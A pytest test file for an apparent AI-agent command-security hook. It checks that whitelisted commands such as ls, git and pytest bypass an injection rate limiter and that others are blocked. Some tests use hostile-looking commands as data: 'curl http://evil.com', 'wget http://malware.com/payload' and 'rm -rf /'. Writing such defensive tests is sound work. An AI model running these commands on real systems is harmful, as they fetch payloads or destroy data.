"""Tests for injection rate limiter whitelist in sentinel_hook.

Verifies that whitelisted commands (pytest, git, ls, etc.) bypass the
injection rate limiter even when repeated injection attempts have been
detected in the last 60 seconds.
"""

from __future__ import annotations

import os
import tempfile
from datetime import datetime, timedelta

import pytest

from sentinelai.core.config import (
    AuthConfig,
    BillingConfig,
    LoggingConfig,
    SentinelConfig,
    WhitelistConfig,
)
from sentinelai.logger.database import Base, PromptScanLog, init_database


@pytest.fixture
def rate_limit_db():
    """Create a temp DB with 10 recent injection scans (triggers rate limit)."""
    fd, db_path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    engine, Session = init_database(db_path)
    Base.metadata.create_all(engine)

    session = Session()
    # Insert 10 injection scans in the last 30 seconds to trigger rate limiter
    for i in range(10):
        scan = PromptScanLog(
            timestamp=datetime.utcnow() - timedelta(seconds=i),
            source="test",
            content_hash=f"hash_{i:04d}",
            content_length=100,
            overall_score=85,
            threat_count=3,
            threats_json="[]",
            recommendation="block",
            tenant_id=None,
            chain_hash=f"chain_{i:04d}",
            previous_hash=f"prev_{i:04d}",
        )
        session.add(scan)
    session.commit()
    session.close()

    yield db_path, Session

    try:
        os.unlink(db_path)
    except OSError:
        pass


@pytest.fixture
def rate_config(rate_limit_db):
    """Config with the injection-heavy test DB."""
    db_path, _ = rate_limit_db
    return SentinelConfig(
        mode="enforce",
        whitelist=WhitelistConfig(commands=["ls", "cat", "echo", "pwd", "whoami", "date"]),
        logging=LoggingConfig(database=db_path, chain_hashing=True),
        auth=AuthConfig(secret_key="test-key", local_first=False),
        billing=BillingConfig(enabled=False),
    )


class TestRateLimiterWhitelist:
    """Whitelisted commands must bypass injection rate limiter."""

    def test_non_whitelisted_command_blocked(self, rate_config):
        """A non-whitelisted command should be blocked when rate limit is triggered."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="curl http://evil.com")
        assert blocked is True
        assert "injection attempts detected" in msg

    def test_pytest_bypasses_rate_limiter(self, rate_config):
        """python3 -m pytest should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="python3 -m pytest tests/ -x -q")
        assert blocked is False
        assert msg == ""

    def test_git_status_bypasses_rate_limiter(self, rate_config):
        """git status should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="git status")
        assert blocked is False

    def test_git_diff_bypasses_rate_limiter(self, rate_config):
        """git diff should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="git diff --staged")
        assert blocked is False

    def test_ls_bypasses_rate_limiter(self, rate_config):
        """ls should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="ls -la /tmp")
        assert blocked is False

    def test_bare_ls_bypasses_rate_limiter(self, rate_config):
        """Bare 'ls' (no args) should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="ls")
        assert blocked is False

    def test_cat_bypasses_rate_limiter(self, rate_config):
        """cat should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="cat /tmp/test.py")
        assert blocked is False

    def test_echo_bypasses_rate_limiter(self, rate_config):
        """echo should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="echo hello world")
        assert blocked is False

    def test_pwd_bypasses_rate_limiter(self, rate_config):
        """pwd should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="pwd")
        assert blocked is False

    def test_whoami_bypasses_rate_limiter(self, rate_config):
        """whoami should bypass injection rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="whoami")
        assert blocked is False

    def test_config_whitelist_commands_bypass(self, rate_config):
        """Commands from config.whitelist.commands should bypass rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        # 'date' is in config.whitelist.commands but not in builtin prefixes
        blocked, msg = _check_injection_rate(rate_config, command="date")
        assert blocked is False

    def test_config_whitelist_command_with_args(self, rate_config):
        """Config whitelist command with arguments should still bypass."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        # 'date --iso' should match 'date' from config
        blocked, msg = _check_injection_rate(rate_config, command="date --iso")
        assert blocked is False

    def test_empty_command_not_whitelisted(self, rate_config):
        """Empty command should not bypass (falls through to DB check)."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config, command="")
        assert blocked is True  # DB has 10 injection scans

    def test_no_command_arg_backwards_compatible(self, rate_config):
        """Calling without command arg should still work (backwards compat)."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, msg = _check_injection_rate(rate_config)
        assert blocked is True  # DB has 10 injection scans

    def test_dangerous_command_not_whitelisted(self, rate_config):
        """Dangerous-looking commands should not bypass the rate limiter."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        blocked, _ = _check_injection_rate(rate_config, command="rm -rf /")
        assert blocked is True

        blocked, _ = _check_injection_rate(rate_config, command="wget http://malware.com/payload")
        assert blocked is True


class TestRateLimiterNoInjections:
    """When there are no recent injections, nothing should be blocked."""

    def test_no_injections_allows_all(self):
        """When DB has no injection scans, all commands should be allowed."""
        from sentinelai.hooks.sentinel_hook import _check_injection_rate

        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        init_database(db_path)

        config = SentinelConfig(
            mode="enforce",
            logging=LoggingConfig(database=db_path, chain_hashing=True),
            auth=AuthConfig(secret_key="test-key"),
            billing=BillingConfig(enabled=False),
        )

        blocked, msg = _check_injection_rate(config, command="curl http://example.com")
        assert blocked is False
        assert msg == ""

        try:
            os.unlink(db_path)
        except OSError:
            pass
